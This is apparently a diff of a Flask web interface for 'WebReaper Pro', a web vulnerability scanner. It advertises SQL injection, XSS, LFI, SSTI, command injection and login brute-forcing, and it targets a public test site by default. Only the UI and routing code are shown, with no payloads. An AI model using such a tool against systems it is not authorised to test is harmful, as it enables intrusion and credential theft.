-  #log::-webkit-scrollbar { width: 6px; }
-  #log::-webkit-scrollbar-track { background: var(--bg3); }
-  #log::-webkit-scrollbar-thumb { background: var(--brd); border-radius: 3px; }
-
-  .entry { display: flex; gap: 10px; padding: 3px 0; align-items: flex-start; }
-  .entry:hover { background: rgba(255,255,255,0.02); border-radius: 4px; }
-  .entry .ts  { color: #555; min-width: 60px; font-size: 11px; padding-top: 2px; }
-  .entry .badge {
-    font-size: 10px; font-weight: bold; padding: 2px 7px;
-    border-radius: 3px; min-width: 68px; text-align: center;
-    letter-spacing: 0.5px; margin-top: 1px;
-  }
-  .badge.CRITICAL { background: rgba(255,51,51,0.2);   color: var(--crit); border: 1px solid rgba(255,51,51,0.3); }
-  .badge.HIGH     { background: rgba(255,107,53,0.2);  color: var(--high); border: 1px solid rgba(255,107,53,0.3); }
-  .badge.MEDIUM   { background: rgba(255,193,7,0.15);  color: var(--med);  border: 1px solid rgba(255,193,7,0.3); }
-  .badge.LOW      { background: rgba(77,171,247,0.15); color: var(--low);  border: 1px solid rgba(77,171,247,0.3); }
-  .badge.INFO     { background: rgba(105,219,124,0.1); color: var(--info); border: 1px solid rgba(105,219,124,0.2); }
-  .badge.SCAN     { background: rgba(204,153,255,0.1); color: var(--scan); border: 1px solid rgba(204,153,255,0.2); }
-
-  .entry .content .msg  { color: var(--txt); }
-  .entry .content .detail { color: var(--dim); font-size: 12px; margin-top: 2px; padding-left: 4px; border-left: 2px solid var(--brd); }
-  .phase-entry { color: var(--scan); padding: 8px 0 4px; font-size: 12px; opacity: .7; }
-  .crawl-entry { color: #444; font-size: 11px; padding: 1px 0; }
-  .done-entry  { color: var(--info); padding: 8px 0; font-weight: bold; border-top: 1px solid var(--brd); margin-top: 8px; }
-
-  #progress-bar {
-    height: 3px;
-    background: var(--acc);
-    width: 0%;
-    transition: width .3s;
-    border-radius: 2px;
-  }
-  .filter-row {
-    display: flex;
-    gap: 8px;
-    flex-wrap: wrap;
-  }
-  .filter-btn {
-    background: var(--bg3);
-    border: 1px solid var(--brd);
-    color: var(--dim);
-    padding: 4px 12px;
-    border-radius: 4px;
-    font-size: 11px;
-    cursor: pointer;
-    transition: all .15s;
-  }
-  .filter-btn:hover, .filter-btn.active { border-color: var(--acc); color: var(--txt); background: rgba(255,51,51,0.1); }
-  .empty-state {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    height: 200px;
-    color: var(--dim);
-    gap: 10px;
-  }
-  .empty-state .icon { font-size: 40px; opacity: .3; }
+:root{
+  --bg:#0a0a0a;--bg2:#111;--bg3:#181818;--brd:#222;
+  --acc:#e03030;--txt:#ddd;--dim:#555;
+  --crit:#ff4444;--high:#ff7b39;--med:#f0c040;
+  --low:#4da6ff;--info:#50d080;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--txt);font-family:'Courier New',monospace;min-height:100vh}
+header{background:var(--bg2);border-bottom:1px solid var(--brd);padding:14px 26px;display:flex;align-items:center}
+.logo{font-size:18px;font-weight:700;color:var(--acc);letter-spacing:3px}
+.logo span{color:#333}
+.sub{color:var(--dim);font-size:10px;margin-top:2px}
+.wrap{max-width:1100px;margin:0 auto;padding:24px 16px}
+.card{background:var(--bg2);border:1px solid var(--brd);border-radius:8px;padding:22px;margin-bottom:16px}
+.ctitle{color:var(--acc);font-size:11px;letter-spacing:2px;margin-bottom:14px}
+.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+input[type=text]{
+  flex:1;min-width:240px;background:var(--bg3);border:1px solid var(--brd);border-radius:6px;
+  color:var(--txt);padding:10px 14px;font-family:monospace;font-size:13px;outline:none;transition:border-color .2s
+}
+input[type=text]:focus{border-color:var(--acc)}
+.opts{display:flex;gap:18px;margin-top:10px;flex-wrap:wrap}
+.opts label{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--dim);cursor:pointer}
+.opts label:hover{color:var(--txt)}
+input[type=checkbox]{accent-color:var(--acc);width:14px;height:14px}
+button{background:var(--acc);color:#fff;border:none;border-radius:6px;padding:10px 24px;font-family:monospace;font-size:12px;font-weight:700;cursor:pointer;letter-spacing:1px;transition:background .15s}
+button:hover:not(:disabled){background:#b82020}
+button:disabled{background:#1a1a1a;color:#333;cursor:default}
+#stop{background:#1a1a1a;border:1px solid var(--brd);display:none}
+#stop:hover{background:#222}
+.bar-wrap{height:2px;background:var(--bg3);border-radius:2px;margin-top:12px}
+.bar{height:100%;background:var(--acc);width:0;transition:width .5s;border-radius:2px}
+.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:16px}
+.stat{background:var(--bg2);border:1px solid var(--brd);border-radius:8px;padding:12px 8px;text-align:center}
+.stat .n{font-size:24px;font-weight:700}.stat .l{font-size:9px;color:var(--dim);letter-spacing:1px;margin-top:2px}
+.crit .n{color:var(--crit)}.high .n{color:var(--high)}.med .n{color:var(--med)}
+.low .n{color:var(--low)}.info .n{color:var(--info)}
+.log-card{background:var(--bg2);border:1px solid var(--brd);border-radius:8px;overflow:hidden}
+.log-head{padding:10px 16px;border-bottom:1px solid var(--brd);display:flex;justify-content:space-between;align-items:center}
+.filters{display:flex;gap:5px;flex-wrap:wrap}
+.fb{background:var(--bg3);border:1px solid var(--brd);color:var(--dim);padding:3px 10px;border-radius:4px;font-size:10px;cursor:pointer;transition:all .15s;font-family:monospace;letter-spacing:.5px}
+.fb:hover,.fb.on{border-color:var(--acc);color:var(--txt);background:rgba(224,48,48,.1)}
+#cnt{color:#2a2a2a;font-size:10px}
+#log{height:500px;overflow-y:auto;padding:12px;font-size:12px;line-height:1.9}
+#log::-webkit-scrollbar{width:4px}
+#log::-webkit-scrollbar-track{background:var(--bg3)}
+#log::-webkit-scrollbar-thumb{background:var(--brd);border-radius:2px}
+.e{display:flex;gap:8px;align-items:flex-start;padding:1px 0}
+.e:hover{background:rgba(255,255,255,.015);border-radius:3px}
+.ets{color:#2a2a2a;min-width:50px;font-size:10px;padding-top:2px}
+.badge{font-size:9px;font-weight:700;padding:2px 7px;border-radius:3px;min-width:68px;text-align:center;letter-spacing:.5px;margin-top:2px;white-space:nowrap}
+.CRITICAL{background:rgba(255,68,68,.15);color:var(--crit);border:1px solid rgba(255,68,68,.3)}
+.HIGH{background:rgba(255,123,57,.15);color:var(--high);border:1px solid rgba(255,123,57,.3)}
+.MEDIUM{background:rgba(240,192,64,.1);color:var(--med);border:1px solid rgba(240,192,64,.25)}
+.LOW{background:rgba(77,166,255,.1);color:var(--low);border:1px solid rgba(77,166,255,.25)}
+.INFO{background:rgba(80,208,128,.08);color:var(--info);border:1px solid rgba(80,208,128,.2)}
+.ec{flex:1;min-width:0}
+.ec .msg{color:var(--txt);word-break:break-all}
+.ec .det{color:var(--dim);font-size:10.5px;margin-top:1px;padding-left:6px;border-left:2px solid var(--brd);word-break:break-all}
+.elog{color:#2f2f2f;font-size:10.5px;padding:0 0 0 126px;word-break:break-all}
+.edone{color:var(--info);padding:8px 0 0;border-top:1px solid var(--brd);margin-top:4px;font-size:11px}
+.empty{display:flex;flex-direction:column;align-items:center;justify-content:center;height:240px;color:#222;gap:8px;font-size:12px}
+.empty .icon{font-size:40px;opacity:.15}
 </style>
 </head>
 <body>
 <header>
   <div>
-    <div class="logo">WEB<span>REAPER</span> <span style="color:var(--dim);font-size:14px">PRO v4.0</span></div>
-    <div class="subtitle">SQLi · XSS · CMDi · LFI · SSTI · Redirect · CORS · Headers · Brute</div>
+    <div class="logo">WEB<span>REAPER</span> <span style="color:#222;font-size:12px">PRO v5</span></div>
+    <div class="sub">SQLi · XSS · LFI · SSTI · CMDi · Open Redirect · CORS · Headers · Sensitive Files · Brute Force</div>
   </div>
 </header>
-
-<div class="container">
-  <div class="scan-box">
-    <h2>// TARGET</h2>
-    <div class="input-row">
-      <input type="url" id="target" placeholder="https://target.com" value="http://testphp.vulnweb.com">
-      <button id="scan-btn" onclick="startScan()">▶ SCAN</button>
-      <button id="stop-btn" onclick="stopScan()">■ STOP</button>
+<div class="wrap">
+  <div class="card">
+    <div class="ctitle">// TARGET</div>
+    <div class="row">
+      <input type="text" id="target" placeholder="http://testphp.vulnweb.com">
+      <button id="go" onclick="startScan()">▶ SCAN</button>
+      <button id="stop" onclick="stopScan()">■ STOP</button>
     </div>
-    <div class="checkboxes">
-      <label><input type="checkbox" id="deep"> Deep crawl (slower, more thorough)</label>
-      <label><input type="checkbox" id="brute"> Brute force login forms</label>
+    <div class="opts">
+      <label><input type="checkbox" id="deep"> Deep crawl</label>
+      <label><input type="checkbox" id="brute"> Brute force logins</label>
     </div>
-    <div id="progress-bar" style="margin-top:14px;"></div>
+    <div class="bar-wrap"><div class="bar" id="bar"></div></div>
   </div>
-
-  <div class="stats-row">
-    <div class="stat-card crit"><div class="count" id="c-crit">0</div><div class="label">CRITICAL</div></div>
-    <div class="stat-card high"><div class="count" id="c-high">0</div><div class="label">HIGH</div></div>
-    <div class="stat-card med" ><div class="count" id="c-med">0</div><div class="label">MEDIUM</div></div>
-    <div class="stat-card low" ><div class="count" id="c-low">0</div><div class="label">LOW</div></div>
-    <div class="stat-card info"><div class="count" id="c-info">0</div><div class="label">INFO</div></div>
+  <div class="stats">
+    <div class="stat crit"><div class="n" id="nc">0</div><div class="l">CRITICAL</div></div>
+    <div class="stat high"><div class="n" id="nh">0</div><div class="l">HIGH</div></div>
+    <div class="stat med" ><div class="n" id="nm">0</div><div class="l">MEDIUM</div></div>
+    <div class="stat low" ><div class="n" id="nl">0</div><div class="l">LOW</div></div>
+    <div class="stat info"><div class="n" id="ni">0</div><div class="l">INFO</div></div>
   </div>
-
-  <div class="results-box">
-    <div class="results-header">
-      <div class="filter-row">
-        <button class="filter-btn active" onclick="setFilter('ALL')">ALL</button>
-        <button class="filter-btn" onclick="setFilter('CRITICAL')">CRITICAL</button>
-        <button class="filter-btn" onclick="setFilter('HIGH')">HIGH</button>
-        <button class="filter-btn" onclick="setFilter('MEDIUM')">MEDIUM</button>
-        <button class="filter-btn" onclick="setFilter('LOW')">LOW</button>
-        <button class="filter-btn" onclick="setFilter('INFO')">INFO</button>
+  <div class="log-card">
+    <div class="log-head">
+      <div class="filters">
+        <button class="fb on" onclick="filt('ALL',this)">ALL</button>
+        <button class="fb" onclick="filt('CRITICAL',this)">CRIT</button>
+        <button class="fb" onclick="filt('HIGH',this)">HIGH</button>
+        <button class="fb" onclick="filt('MEDIUM',this)">MED</button>
+        <button class="fb" onclick="filt('LOW',this)">LOW</button>
+        <button class="fb" onclick="filt('INFO',this)">INFO</button>
+        <button class="fb" onclick="filt('LOG',this)">LOG</button>
       </div>
-      <span id="entry-count" style="color:#555;font-size:11px">0 entries</span>
+      <span id="cnt">–</span>
     </div>
-    <div id="log">
-      <div class="empty-state">
-        <div class="icon">🕷</div>
-        <div>Enter a URL and click SCAN</div>
-      </div>
-    </div>
+    <div id="log"><div class="empty"><div class="icon">⚡</div><div>Enter a URL and click SCAN</div></div></div>
   </div>
 </div>
-
 <script>
-let pollTimer = null;
-let scanId    = null;
-let offset    = 0;
-let allEntries = [];
-let currentFilter = 'ALL';
-const counts = {CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0, INFO:0};
-
-function setFilter(f) {
-  currentFilter = f;
-  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
-  event.target.classList.add('active');
-  renderEntries();
-}
-
-function renderEntries() {
-  const log = document.getElementById('log');
-  if (allEntries.length === 0) {
-    log.innerHTML = '<div class="empty-state"><div class="icon">🕷</div><div>Enter a URL and click SCAN</div></div>';
-    return;
+let timer=null,sid=null,offset=0,filter='ALL';
+let entries=[],counts={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0};
+function filt(f,btn){filter=f;document.querySelectorAll('.fb').forEach(b=>b.classList.remove('on'));btn.classList.add('on');render();}
+function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function render(){
+  const el=document.getElementById('log');let html='';
+  for(const e of entries){
+    if(e.type==='log'){if(filter!=='ALL'&&filter!=='LOG')continue;html+=`<div class="elog">${esc(e.msg)}</div>`;}
+    else if(e.type==='finding'){
+      if(filter!=='ALL'&&filter!==e.level)continue;
+      html+=`<div class="e"><span class="ets">${e.ts||''}</span><span class="badge ${e.level}">${e.level}</span><span class="ec"><div class="msg">${esc(e.msg)}</div>${e.detail?`<div class="det">${esc(e.detail)}</div>`:''}</span></div>`;
+    }
   }
-  const html = allEntries.map(e => {
-    if (e.type === 'phase') return `<div class="phase-entry">── ${esc(e.msg)}</div>`;
-    if (e.type === 'crawl') return `<div class="crawl-entry">${esc(e.msg)}</div>`;
-    if (e.type === 'done')  return `<div class="done-entry">✓ ${esc(e.msg)}</div>`;
-    if (currentFilter !== 'ALL' && e.level !== currentFilter) return '';
-    return `<div class="entry">
-      <span class="ts">${e.ts||''}</span>
-      <span class="badge ${e.level}">${e.level}</span>
-      <span class="content">
-        <div class="msg">${esc(e.msg)}</div>
-        ${e.detail ? `<div class="detail">${esc(e.detail)}</div>` : ''}
-      </span>
-    </div>`;
-  }).join('');
-  log.innerHTML = html;
-  log.scrollTop = log.scrollHeight;
-  document.getElementById('entry-count').textContent =
-    allEntries.filter(e => e.level).length + ' findings';
+  el.innerHTML=html||'<div class="empty"><div class="icon">⚡</div><div>No entries match filter</div></div>';
+  el.scrollTop=el.scrollHeight;
+  const f=entries.filter(e=>e.type==='finding').length;
+  document.getElementById('cnt').textContent=f+' finding'+(f!==1?'s':'');
 }
-
-function esc(s) {
-  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+async function startScan(){
+  const target=document.getElementById('target').value.trim();if(!target)return;
+  stopScan();entries=[];
+  Object.keys(counts).forEach(k=>{counts[k]=0;});
+  ['nc','nh','nm','nl','ni'].forEach(id=>document.getElementById(id).textContent='0');
+  render();
+  document.getElementById('go').disabled=true;
+  document.getElementById('stop').style.display='inline-block';
+  document.getElementById('bar').style.width='3%';
+  document.getElementById('cnt').textContent='scanning…';
+  const deep=document.getElementById('deep').checked;
+  const brute=document.getElementById('brute').checked;
+  try{
+    const r=await fetch('/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target,deep,brute})});
+    const d=await r.json();
+    if(d.error){entries.push({type:'log',msg:'Error: '+d.error,ts:''});render();doneScan();return;}
+    sid=d.scan_id;offset=0;timer=setInterval(poll,900);
+  }catch(e){entries.push({type:'log',msg:'Fetch error: '+e,ts:''});render();doneScan();}
 }
-
-async function startScan() {
-  const target = document.getElementById('target').value.trim();
-  if (!target) return;
-  stopScan();
-
-  allEntries = [];
-  Object.keys(counts).forEach(k => { counts[k]=0; document.getElementById('c-'+k.toLowerCase()).textContent='0'; });
-  renderEntries();
-
-  document.getElementById('scan-btn').disabled = true;
-  document.getElementById('stop-btn').style.display = 'inline-block';
-  document.getElementById('progress-bar').style.width = '5%';
-
-  const deep  = document.getElementById('deep').checked;
-  const brute = document.getElementById('brute').checked;
-
-  try {
-    const res = await fetch('/start', {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({target, deep, brute})
-    });
-    const data = await res.json();
-    scanId = data.scan_id;
-    offset = 0;
-    pollTimer = setInterval(poll, 800);
-  } catch(e) {
-    allEntries.push({type:'done', msg:'Failed to start: '+e});
-    renderEntries();
-    document.getElementById('scan-btn').disabled = false;
-    document.getElementById('stop-btn').style.display = 'none';
-  }
-}
-
-async function poll() {
-  if (!scanId) return;
-  try {
-    const res  = await fetch(`/poll/${scanId}?offset=${offset}`);
-    const data = await res.json();
-
-    for (const item of data.items) {
-      allEntries.push(item);
-      if (item.level && counts[item.level] !== undefined) {
+async function poll(){
+  if(!sid)return;
+  try{
+    const r=await fetch('/poll/'+sid+'?offset='+offset);
+    const d=await r.json();
+    for(const item of d.items){
+      entries.push(item);
+      if(item.type==='finding'&&counts[item.level]!==undefined){
         counts[item.level]++;
-        document.getElementById('c-'+item.level.toLowerCase()).textContent = counts[item.level];
+        const m={CRITICAL:'nc',HIGH:'nh',MEDIUM:'nm',LOW:'nl',INFO:'ni'};
+        if(m[item.level])document.getElementById(m[item.level]).textContent=counts[item.level];
       }
     }
-    offset += data.items.length;
-
-    const prog = Math.min(5 + allEntries.length * 0.5, 95);
-    document.getElementById('progress-bar').style.width = prog + '%';
-
-    renderEntries();
-
-    if (data.done) {
-      clearInterval(pollTimer);
-      pollTimer = null;
-      scanId    = null;
-      document.getElementById('progress-bar').style.width = '100%';
-      document.getElementById('scan-btn').disabled = false;
-      document.getElementById('stop-btn').style.display = 'none';
-    }
-  } catch(e) { /* network hiccup, retry next tick */ }
+    offset+=d.items.length;
+    const p=Math.min(5+(offset*1.5),95);
+    document.getElementById('bar').style.width=p+'%';
+    render();
+    if(d.done){document.getElementById('bar').style.width='100%';doneScan();}
+  }catch(e){}
 }
-
-function stopScan() {
-  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
-  scanId = null;
-  document.getElementById('scan-btn').disabled = false;
-  document.getElementById('stop-btn').style.display = 'none';
-  if (allEntries.length > 0) {
-    allEntries.push({type:'done', msg:'Scan stopped by user'});
-    renderEntries();
-  }
-}
-
-document.getElementById('target').addEventListener('keydown', e => {
-  if (e.key === 'Enter') startScan();
-});
+function doneScan(){if(timer){clearInterval(timer);timer=null;}sid=null;document.getElementById('go').disabled=false;document.getElementById('stop').style.display='none';}
+function stopScan(){if(sid)fetch('/stop/'+sid,{method:'POST'}).catch(()=>{});doneScan();}
+document.getElementById('target').addEventListener('keydown',e=>{if(e.key==='Enter')startScan();});
 </script>
 </body>
 </html>"""
+
+# ══════════════════════════════════════════════════════════════
+#  ROUTES
+# ══════════════════════════════════════════════════════════════
 
 @app.route("/")
 def index():
     return render_template_string(HTML)
 
 @app.route("/start", methods=["POST"])
-def start_scan():
-    data   = request.get_json(force=True)
-    target = data.get("target","").strip()
+def start():
+    data   = freq.get_json(force=True)
+    target = data.get("target", "").strip()
     deep   = bool(data.get("deep", False))
     brute  = bool(data.get("brute", False))
-
-    if not target.startswith(("http://","https://")):
+    if not target:
+        return jsonify({"error": "No target provided"}), 400
+    if not target.startswith(("http://", "https://")):
         target = "http://" + target
-
     sid = str(uuid.uuid4())
-    q   = queue.Queue()
-    SCANS[sid] = {"queue": q, "done": False, "buf": []}
-
-    def run():
-        try:
-            scan(target, deep, brute, lambda x: q.put(x))
-        except Exception as e:
-            q.put({"type":"done","msg":f"Error: {str(e)}"})
-
-    threading.Thread(target=run, daemon=True).start()
-
-    # drain queue into buf in background
-    def drainer():
-        while True:
-            try:
-                item = q.get(timeout=90)
-                SCANS[sid]["buf"].append(item)
-                if item.get("type") == "done":
-                    SCANS[sid]["done"] = True
-                    break
-            except queue.Empty:
-                SCANS[sid]["buf"].append({"type":"done","msg":"Timeout"})
-                SCANS[sid]["done"] = True
-                break
-
-    threading.Thread(target=drainer, daemon=True).start()
+    SCANS[sid] = {"lines": [], "done": False}
+    threading.Thread(target=scan_worker, args=(sid, target, deep, brute), daemon=True).start()
     return jsonify({"scan_id": sid})
 
 @app.route("/poll/<sid>")
 def poll(sid):
     if sid not in SCANS:
-        return jsonify({"items":[],"done":True})
-    entry  = SCANS[sid]
-    offset = int(request.args.get("offset", 0))
-    items  = entry["buf"][offset:]
-    done   = entry["done"]
-    # cleanup after done + all items fetched
-    if done and offset + len(items) >= len(entry["buf"]):
-        SCANS.pop(sid, None)
-    return jsonify({"items": items, "done": done})
+        return jsonify({"items": [], "done": True})
+    state  = SCANS[sid]
+    offset = int(freq.args.get("offset", 0))
+    return jsonify({"items": state["lines"][offset:], "done": state["done"]})
+
+@app.route("/stop/<sid>", methods=["POST"])
+def stop_scan(sid):
+    if sid in SCANS:
+        SCANS[sid]["done"] = True
+    return jsonify({"ok": True})
 
 if __name__ == "__main__":
-    print("""
- ██╗    ██╗███████╗██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
- ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
- ██║ █╗ ██║█████╗  ██████╔╝██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
- ██║███╗██║██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
- ╚███╔███╔╝███████╗██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
-  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
-
-  Web Interface → http://localhost:5000
-""")
+    print("\n  WebReaper Pro v5 → http://localhost:5000\n")
     app.run(debug=False, host="0.0.0.0", port=5000, threaded=True)
